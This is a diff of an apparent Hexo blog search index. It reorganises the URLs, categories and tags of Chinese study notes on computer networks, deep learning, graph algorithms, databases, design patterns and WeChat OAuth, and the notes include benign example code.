         <tag>计算机系统</tag>
@@ -4742,7 +4789,7 @@
   </entry>
   <entry>
     <title>《计算机网络》笔记-第3章运输层</title>
-    <url>/cs/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82.html</url>
+    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><blockquote>
 <p>Chapter 3 Transport Layer</p>
@@ -5257,7 +5304,8 @@
 <p>而使用UDP很容易导致IP分片。</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机网络</category>
       </categories>
       <tags>
         <tag>计算机网络</tag>
@@ -5265,7 +5313,7 @@
   </entry>
   <entry>
     <title>吴恩达深度学习第一课笔记 - 神经网络与深度学习</title>
-    <url>/cs-pro/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0.html</url>
+    <url>/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>观看吴恩达深度学习视频的学习笔记。</p>
 <p>此为第一课——神经网络与深度学习，共四周。</p>
 <p>最后，B站牛逼。</p>
@@ -5366,15 +5414,17 @@
 <p><img src=".\吴恩达深度学习第一课笔记-神经网络与深度学习\3-1-1.png" alt="3-1-1"></p>
 ]]></content>
       <categories>
-        <category>计算机进阶</category>
+        <category>欲穷千里目，更上一层楼</category>
+        <category>人工智能</category>
       </categories>
       <tags>
         <tag>深度学习</tag>
+        <tag>人工智能</tag>
       </tags>
   </entry>
   <entry>
     <title>后端面试问题汇总</title>
-    <url>/cs/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB.html</url>
+    <url>/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>起因：为2020年暑期实习生面试而准备，主要针对后端开发。</p>
 <p>很多知识还了解得不够深入，如果存在错误，欢迎指正。</p>
@@ -5705,15 +5755,15 @@
 </ul>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
+        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
     <title>吴恩达深度学习第四课笔记 - 卷积神经网络</title>
-    <url>/cs-pro/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</url>
+    <url>/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E8%AF%BE%E7%AC%94%E8%AE%B0-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>软件杯需要，先略看第四课。</p>
 <a id="more"></a>
 <h2 id="1-卷积神经网络"><a href="#1-卷积神经网络" class="headerlink" title="1. 卷积神经网络"></a>1. 卷积神经网络</h2><h3 id="1-1-计算机视觉"><a href="#1-1-计算机视觉" class="headerlink" title="1.1.计算机视觉"></a>1.1.计算机视觉</h3><p>计算机视觉中一些待解决的问题：</p>
@@ -5842,15 +5892,17 @@
 <p><img src=".\吴恩达深度学习第四课笔记-卷积神经网络\2-2-4.png" alt="2-2-4"></p>
 ]]></content>
       <categories>
-        <category>计算机进阶</category>
+        <category>欲穷千里目，更上一层楼</category>
+        <category>人工智能</category>
       </categories>
       <tags>
         <tag>深度学习</tag>
+        <tag>人工智能</tag>
       </tags>
   </entry>
   <entry>
     <title>图-离散数学</title>
-    <url>/cs/%E5%9B%BE.html</url>
+    <url>/%E5%9B%BE.html</url>
     <content><![CDATA[<h2 id="一、图的基本概念"><a href="#一、图的基本概念" class="headerlink" title="一、图的基本概念"></a>一、图的基本概念</h2><h3 id="1-图的定义"><a href="#1-图的定义" class="headerlink" title="1.图的定义"></a>1.图的定义</h3><p>由顶点构成的集合，称为顶点集 V 。</p>
 <p>由顶点构成的 无方向的<code>无序对 (v1, v2)</code> 或 有方向的<code>有序对 &lt;v1, v2&gt;</code> 称为边 e 。由边构成的集合，称为边集 E 。</p>
 <p>由 V E 构成的二元组 &lt;V, E&gt; 就是图，无向图称为 G ，有向图称为 D 。</p>
@@ -5872,15 +5924,17 @@
 <h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>鉴于离散数学课程成绩惨不忍睹，就不在此献丑了。</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数学</category>
       </categories>
       <tags>
         <tag>数学</tag>
+        <tag>离散数学</tag>
       </tags>
   </entry>
   <entry>
     <title>图的最小生成树算法</title>
-    <url>/cs/%E5%9B%BE%E7%9A%84%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E7%AE%97%E6%B3%95.html</url>
+    <url>/%E5%9B%BE%E7%9A%84%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E7%AE%97%E6%B3%95.html</url>
     <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p>对于稀疏图(边较少)，用<code>Kruskal(克鲁斯卡尔)</code>算法求最小生成树，无疑是上上之选。</p>
 <h3 id="1-最小生成树"><a href="#1-最小生成树" class="headerlink" title="1. 最小生成树"></a>1. 最小生成树</h3><p>什么是最小生成树？<del>一个<strong>连通图</strong>的极小连通子图</del> 对不起，请先学好黄老师的离散数学。</p>
 <a id="more"></a>
@@ -5904,15 +5958,17 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> from, to;</span><br><span class="line">    <span class="keyword">int</span> weight;</span><br><span class="line">&#125;Arc;</span><br><span class="line"></span><br><span class="line">Arc arcs[<span class="number">100005</span>];   <span class="comment">// 边集合</span></span><br><span class="line"><span class="keyword">int</span> points[<span class="number">1005</span>];   <span class="comment">// 并查集</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找n点所处等价类的头结点</span></span><br><span class="line"><span class="comment">// 并在此过程中，将线形压缩成树形</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n == points[n] ? n : points[n] = <span class="built_in">find</span>(points[n]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入系统sort快排函数的cmp函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Arc a, Arc b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.weight &lt; b.weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n=<span class="number">0</span>, m=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) points[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;arcs[i].from, &amp;arcs[i].to, &amp;arcs[i].weight);   <span class="comment">// 用cin比scanf慢</span></span><br><span class="line">        arcs[i].from--;</span><br><span class="line">        arcs[i].to--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对m条边，进行快速排序</span></span><br><span class="line">    sort(arcs, arcs+m, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;m; i++) &#123;</span><br><span class="line">        <span class="comment">// 找到from点所在连通点集合的头结点</span></span><br><span class="line">        <span class="keyword">int</span> x = <span class="built_in">find</span>(arcs[i].from);</span><br><span class="line">        <span class="comment">// 同理</span></span><br><span class="line">        <span class="keyword">int</span> y = <span class="built_in">find</span>(arcs[i].to);</span><br><span class="line">        <span class="comment">// 如果from点所在连通点集合的头结点与to点的不相等</span></span><br><span class="line">        <span class="comment">// 则说明from、to点不连通</span></span><br><span class="line">        <span class="keyword">if</span> (x != y) &#123;</span><br><span class="line">            <span class="comment">// 将from点所在连通点集的头结点，纳入到to点所在连通点集中</span></span><br><span class="line">            <span class="comment">// 即将两个集合连通</span></span><br><span class="line">            points[x] = y;</span><br><span class="line">            sum += arcs[i].weight;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数据结构与算法</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>数据结构与算法</tag>
+        <tag>图</tag>
       </tags>
   </entry>
   <entry>
     <title>复习直方图与条形图</title>
-    <url>/cs/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE.html</url>
+    <url>/%E5%A4%8D%E4%B9%A0%E7%9B%B4%E6%96%B9%E5%9B%BE%E4%B8%8E%E6%9D%A1%E5%BD%A2%E5%9B%BE.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>在用python实现正态分布等概率分布函数时，混淆了直方图和条形图，又由于概率论没学到位，导致实现中遇到了不小的困难。</p>
 <p>因而，借此篇博客复习一下，高中所学的直方图和条形图。。。</p>
 <a id="more"></a>
@@ -5973,7 +6029,8 @@
 <figure class="highlight console"><table><tr><td class="code"><pre><span class="line">x: [ 1.76932332  0.36522094  5.1450445   0.05004145  1.7720948   2.72576013</span><br><span class="line"> -0.10808016  1.89746125  3.63410412  2.91262325  4.10054093 -0.89758685</span><br><span class="line">  1.11546737  4.27508464  0.76085493  1.47257128  4.5245259   2.34713613</span><br><span class="line"> -0.05875876  8.75851437 -0.86486252 -0.34872341  0.07018679  0.88436324</span><br><span class="line">  0.48392354  0.1297039  -0.59002276  3.10785551  1.3165206   2.71668659</span><br><span class="line">  2.11486526 -0.84586926 -0.3576636   2.09204617  0.53542808  4.48640303</span><br><span class="line"> -0.52501128 -2.04203587 -1.57609217  0.92228732 -2.28138689  1.92260707</span><br><span class="line">  1.94208858  3.98329461 -4.28621987  0.0471915  -4.21319167  0.80202259</span><br><span class="line">  3.875302    2.73255094 -1.40581636  1.17265753 -2.22711288  1.1008017</span><br><span class="line">  1.87824436  3.10236217  1.43048658  1.00748939  4.80039664  0.8898163</span><br><span class="line">  2.82500036  1.7141756  -1.2301184   1.16866276  1.66890047  0.6901983</span><br><span class="line">  1.42811743  1.22482293 -0.25517217  1.78918545 -2.82314372 -1.79081425</span><br><span class="line"> -0.48748191  2.9755605  -2.07325393  1.17953198  3.76772486  0.41385189</span><br><span class="line">  0.83417547  1.15602977 -3.80374808 -1.63877772  2.14545695  3.10734999</span><br><span class="line"> -3.17789913  1.86693313  0.41279216  2.02547252  1.60170928  1.83176309</span><br><span class="line">  4.23187971 -0.3603266  -0.73596668  1.21855677 -2.12121712 -0.20157449</span><br><span class="line">  0.06652799  2.84224194  2.15910299  3.5127497 ]</span><br><span class="line">y: [1.85246481e-01 1.89672995e-01 2.32893302e-02 1.78192943e-01</span><br><span class="line"> 1.85147586e-01 1.37467642e-01 1.71089936e-01 1.80366335e-01</span><br><span class="line"> 8.37935889e-02 1.26267617e-01 5.99793484e-02 1.27175126e-01</span><br><span class="line"> 1.99138981e-01 5.21903254e-02 1.98050247e-01 1.93979816e-01</span><br><span class="line"> 4.22195850e-02 1.58987025e-01 1.73390851e-01 1.07673843e-04</span><br><span class="line"> 1.29147548e-01 1.58902008e-01 1.79038432e-01 1.99138006e-01</span><br><span class="line"> 1.92939699e-01 1.81452272e-01 1.45423186e-01 1.14467130e-01</span><br><span class="line"> 1.96988707e-01 1.38005420e-01 1.70767673e-01 1.30290347e-01</span><br><span class="line"> 1.58422143e-01 1.71846040e-01 1.94161674e-01 4.36539516e-02</span><br><span class="line"> 1.49151436e-01 6.27351432e-02 8.70200197e-02 1.99320615e-01</span><br><span class="line"> 5.19214540e-02 1.79337425e-01 1.78524921e-01 6.55729800e-02</span><br><span class="line"> 6.06572758e-03 1.78072195e-01 6.67586408e-03 1.98496245e-01</span><br><span class="line"> 7.09694403e-02 1.37064685e-01 9.67543721e-02 1.98729228e-01</span><br><span class="line"> 5.42654299e-02 1.99217948e-01 1.81137321e-01 1.14798536e-01</span><br><span class="line"> 1.94903532e-01 1.99469742e-01 3.27955468e-02 1.99168661e-01</span><br><span class="line"> 1.31543984e-01 1.87150614e-01 1.07124430e-01 1.98763102e-01</span><br><span class="line"> 1.88621259e-01 1.97092356e-01 1.94953096e-01 1.98214821e-01</span><br><span class="line"> 1.63814947e-01 1.84531071e-01 3.20922985e-02 7.53458647e-02</span><br><span class="line"> 1.51274227e-01 1.22463700e-01 6.12557886e-02 1.98669094e-01</span><br><span class="line"> 7.65643798e-02 1.91085957e-01 1.98786691e-01 1.98865040e-01</span><br><span class="line"> 1.11469968e-02 8.35358669e-02 1.69298023e-01 1.14497623e-01</span><br><span class="line"> 2.25067310e-02 1.81584831e-01 1.91056259e-01 1.74901040e-01</span><br><span class="line"> 1.90644952e-01 1.82945965e-01 5.40569843e-02 1.58278875e-01</span><br><span class="line"> 1.36861850e-01 1.98283670e-01 5.90225768e-02 1.66533569e-01</span><br><span class="line"> 1.78885926e-01 1.30508407e-01 1.68633817e-01 9.05978680e-02]</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数学</category>
       </categories>
       <tags>
         <tag>数学</tag>
@@ -5981,7 +6038,7 @@
   </entry>
   <entry>
     <title>图的最短路径算法</title>
-    <url>/cs/%E5%9B%BE%E7%9A%84%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%AE%97%E6%B3%95.html</url>
+    <url>/%E5%9B%BE%E7%9A%84%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%AE%97%E6%B3%95.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>本文将介绍求解图最短路径的三个经典算法：迪杰斯特拉 Dijkstra、弗洛伊德 Floyd、贝尔曼-福特 Bellman-Ford。</p>
 <a id="more"></a>
 <h2 id="1-迪杰斯特拉-Dijkstra"><a href="#1-迪杰斯特拉-Dijkstra" class="headerlink" title="1. 迪杰斯特拉 Dijkstra"></a>1. 迪杰斯特拉 Dijkstra</h2><p>迪杰斯特拉算法，用于解决 “<strong>给定起始点</strong>到其余点的最短路径” 问题，即<strong>单源最短路径算法</strong>。时间复杂度为 $O(n^2)$。其本质是<strong>贪心</strong>。</p>
@@ -6042,15 +6099,17 @@
 <h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><p><a href="https://zhuanlan.zhihu.com/p/33162490" target="_blank" rel="noopener">【原创】算法系列——四种最短路算法：Floyd，Dijkstra，Bellman-Ford，SPFA</a></p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数据结构与算法</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>数据结构与算法</tag>
+        <tag>图</tag>
       </tags>
   </entry>
   <entry>
     <title>工厂方法模式</title>
-    <url>/application/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.html</url>
+    <url>/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.html</url>
     <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>工厂方法模式(Factory Method)，又称虚构造器。在《设计模式》中如此定义：</p>
 <blockquote>
 <p>定义一个用于创建对象的接口，让子类决定实例化哪一个类。Factory Method 使一个类的实例化延迟到其子类。</p>
@@ -6094,8 +6153,7 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Creator creatorA = <span class="keyword">new</span> ConcreteCreator_A();</span><br><span class="line">Product productA = creatorA.createProudct();</span><br><span class="line">productA.printInfo();</span><br></pre></td></tr></table></figure>
 <p>但是问题来了，为什么不直接告诉用户产品A的类名<code>ConcreteProduct_A</code>，用户直接<code>new ConcreteProduct_A()</code>，不也能得到产品A的实例吗？</p>
 <p>其实，真正的工厂方法并没有那么简单，不是直接<code>new ConcreteProduct_A()</code>返回一个产品实例就完事的，而是需要对产品进行相应的“封装”才返回给用户的。</p>
-<h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>实际开发中，工厂方法模式对于普通用户、普通应用是没有太大作用的，但是对于一些框架的开发是十分有用的。</p>
-<h4 id="JDBC数据库连接"><a href="#JDBC数据库连接" class="headerlink" title="JDBC数据库连接"></a>JDBC数据库连接</h4><p>以<code>JDBC</code>为例，我们用<code>java</code>连接<code>MySql</code>数据库的常规代码如下：</p>
+<h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><h4 id="JDBC数据库连接"><a href="#JDBC数据库连接" class="headerlink" title="JDBC数据库连接"></a>JDBC数据库连接</h4><p>以<code>JDBC</code>为例，我们用<code>java</code>连接<code>MySql</code>数据库的常规代码如下：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;     <span class="comment">// jdk数据库连接器</span></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  <span class="comment">// jdk驱动加载管理器</span></span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;      <span class="comment">// jdk数据接收器</span></span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;      <span class="comment">// jdk数据sql执行对象</span></span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Driver;   <span class="comment">// 导入mysql的jdbc包</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、首先咱们把mysql的驱动交给java管理</span></span><br><span class="line">DriverManager.registerDriver(<span class="keyword">new</span> Driver());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、建立数据库连接，并得到数据库连接对象</span></span><br><span class="line">Connection conn = DriverManager.getConnection(<span class="string">"jdbc:mysql://url"</span>, <span class="string">"root"</span>, <span class="string">"xxxxxx"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、得到执行sql的对象</span></span><br><span class="line">Statement sta = conn.createStatement();</span><br></pre></td></tr></table></figure>
 <p>在这个过程中，<code>java.sql.Connection</code>和<code>java.sql.Driver</code>是<code>java</code>提供给数据库方的<strong>接口</strong>。<code>java</code>提供这种规范，要求数据库方必须实现这两个接口，才能让<code>java</code>连接到数据库。同时，由于是接口，用户不能实例化，只有通过工厂方法才能得到实例对象。</p>
@@ -6112,7 +6170,8 @@
 <p>总而言之，工厂方法模式在框架开发、多人协作的方面有着广泛的应用，大大降低了各模块之间的耦合性。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>九层之台，起于累土</category>
+        <category>软件工程</category>
       </categories>
       <tags>
         <tag>设计模式</tag>
@@ -6120,7 +6179,7 @@
   </entry>
   <entry>
     <title>在WSL中安装node的问题与解决</title>
-    <url>/application/%E5%9C%A8WSL%E4%B8%AD%E5%AE%89%E8%A3%85node%E7%9A%84%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3.html</url>
+    <url>/%E5%9C%A8WSL%E4%B8%AD%E5%AE%89%E8%A3%85node%E7%9A%84%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于下载<code>WSL+cmder</code>后，再也不想打开Windows的命令行了，便想将Windows下的环境变量也在WSL中设置一份，Node即其中之一。由于Windows二进制文件与linux的不兼容，所以是不能直接使用Windows下的环境变量的。于是，便需要自己手动在linux中下载node。</p>
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>在linux下，下载软件方式众多。由于我不太喜欢用<code>apt-get</code>进行下载，便准备自行下载。</p>
 <p>首先，找到nodejs官网上<strong>编译后的linux下载安装包的链接</strong>(此处不选择源码下载，懒于编译)。</p>
@@ -6146,16 +6205,15 @@
 <p>即将node环境变量置于所有环境变量之前。修改完别忘记<code>source /etc/profile</code>。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
         <tag>Javascript</tag>
       </tags>
   </entry>
   <entry>
     <title>微信网页获取用户信息(PHP、python实现)</title>
-    <url>/application/%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF.html</url>
+    <url>/%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>准备：</p>
 <ul>
 <li><p>微信认证公众号(要求企业才能认证)，或<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421137522" target="_blank" rel="noopener">微信测试号(推荐)</a></p>
@@ -6170,11 +6228,11 @@
 <p>在本文中，笔者将简述微信网页获取用户信息的三个主要步骤，并附上后端PHP/python代码。</p>
 <a id="more"></a>
 <h2 id="1-PHP实现"><a href="#1-PHP实现" class="headerlink" title="1. PHP实现"></a>1. PHP实现</h2><h3 id="第一步：重定位到微信提供的接口，引导用户同意授权"><a href="#第一步：重定位到微信提供的接口，引导用户同意授权" class="headerlink" title="第一步：重定位到微信提供的接口，引导用户同意授权"></a>第一步：重定位到微信提供的接口，引导用户同意授权</h3><p>后端重定位跳转到微信提供的接口URL，即微信端的界面，此时会出现是否授权界面。用户同意授权后，微信服务器会跳转到参数中设置的<strong>回调地址</strong>，并携带code和state参数，如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_uri/?code=CODE&amp;state=STATE。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_uri&#x2F;?code&#x3D;CODE&amp;state&#x3D;STATE。</span><br></pre></td></tr></table></figure>
 <p>此处，<strong>回调地址需要在公众号中配置</strong>。以测试公众号为例，在 体验<strong>接口权限表</strong> - <strong>网页服务</strong>类目 - <strong>网页授权获取用户基本信息</strong>接口 处点击修改，设置回调域名(或IP，测试号支持回调为IP地址)。</p>
 <p><img src="微信网页获取用户信息/1.png" alt="img"></p>
 <p>实现第一个步骤，需要请求的接口如下(文档中也有)：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://open.weixin.qq.com/connect/oauth2/authorize?appid=&#123;APPID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=code&amp;scope=&#123;SCOPE&#125;&amp;state=&#123;STATE&#125;#wechat_redirect</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;open.weixin.qq.com&#x2F;connect&#x2F;oauth2&#x2F;authorize?appid&#x3D;&#123;APPID&#125;&amp;redirect_uri&#x3D;&#123;REDIRECT_URI&#125;&amp;response_type&#x3D;code&amp;scope&#x3D;&#123;SCOPE&#125;&amp;state&#x3D;&#123;STATE&#125;#wechat_redirect</span><br></pre></td></tr></table></figure>
 <p>后端可以通过<strong>重定向</strong>的方式，设置好参数后跳转到该URL。PHP进行重定向跳转代码如下：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line">$url = <span class="string">"https://open.weixin.qq.com/connect/oauth2/authorize?appid=&#123;APPID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=code&amp;scope=&#123;SCOPE&#125;&amp;state=&#123;STATE&#125;#wechat_redirect"</span>;</span><br><span class="line">Header(<span class="string">"Location:$url"</span>);</span><br></pre></td></tr></table></figure>
 <p>url中的参数需要用户填写的，至于如何填写请参照<strong>微信文档</strong>中的要求。</p>
@@ -6205,16 +6263,17 @@
 <h2 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h2><p>本文有任何不足或错误之处，欢迎大家指正批评。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
-        <tag>微信开发</tag>
+        <tag>Python</tag>
+        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
     <title>数据库复习小记</title>
-    <url>/cs/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
+    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>大三下，只剩一门数据库原理课程考试了，趁复习之际，我打算对数据库内容知识进行简单总结。</p>
 <p>实习面试时，曾倍受不懂数据库之苦。虽然以前接触过MySQL等数据库，但并没有深入了解和研究，对其原理更是雾里看花。</p>
@@ -6520,7 +6579,8 @@
 <p>事务遵守两段锁协议是可串行化调度的充分条件。</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数据库</category>
       </categories>
       <tags>
         <tag>数据库</tag>
@@ -6528,7 +6588,7 @@
   </entry>
   <entry>
     <title>浅入浅出语义分割</title>
-    <url>/cs-pro/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2.html</url>
+    <url>/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>与祁老师一同参加2020年软件杯，选择了一个有关语义分割的题目。（项目完成一大半的时候，由于出题方很 nt 地中途把题目改成了目标识别和检测，我们最终被迫放弃。。。）</p>
 <p>语义分割具体是什么就不解释了，大概是深度学习在计算机视觉上的一种运用罢了。</p>
 <p>为了入门语义分割，我粗略地从经典的CNN网络，了解到语义分割的鼻祖——FCN网络，笔记如下。</p>
@@ -6595,15 +6655,18 @@
